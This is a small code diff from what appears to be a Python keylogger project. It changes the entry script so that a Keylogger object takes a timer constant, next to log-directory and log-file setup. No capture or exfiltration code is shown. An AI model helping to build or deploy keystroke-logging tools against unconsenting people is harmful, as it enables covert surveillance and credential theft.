@@ -7,7 +7,7 @@ if __name__ == "__main__":
     directory_manager = DirectoryManager()
     file_manager = FileManager()
     logger = Logger(Constants.PATH_LOG, Constants.FILE_NAME_LOG)
-    keylogger = Keylogger()
+    keylogger = Keylogger(Constants.KEYLOGGER_TIMER)
 
     directory_manager.create_directory(Constants.PATH_LOG)
     file_manager.create_file(Constants.PATH_LOG, Constants.FILE_NAME_LOG)
